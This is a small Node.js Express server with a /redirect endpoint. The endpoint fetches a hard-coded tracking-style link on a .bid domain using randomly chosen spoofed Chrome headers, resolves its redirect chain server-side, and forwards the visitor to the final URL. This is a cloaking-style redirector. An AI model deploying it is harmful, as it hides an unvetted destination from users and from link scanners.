const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Serve static files (your HTML page)
app.use(express.static('.'));

// Array of realistic Chrome user agents
const chromeAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

// Redirect endpoint
app.get('/redirect', async (req, res) => {
    // Pick a random Chrome user agent
    const randomAgent = chromeAgents[Math.floor(Math.random() * chromeAgents.length)];
    
    // Target URL
    const targetUrl = 'https://xmaaubb.bid/cl/7c783b43c8b3cc6c';
    
    try {
        // Make request with Chrome user agent
        const response = await axios.get(targetUrl, {
            headers: { 
                'User-Agent': randomAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            },
            maxRedirects: 5,
            validateStatus: function (status) {
                return status >= 200 && status < 400;
            }
        });
        
        // Get the final URL after redirects
        const finalUrl = response.request.res.responseUrl || targetUrl;
        
        // Redirect user to final destination
        res.redirect(finalUrl);
    } catch (error) {
        // If there's an error, just redirect to target URL
        console.error('Redirect error:', error.message);
        res.redirect(targetUrl);
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Open http://localhost:${PORT}/home.html to view the page`);
});
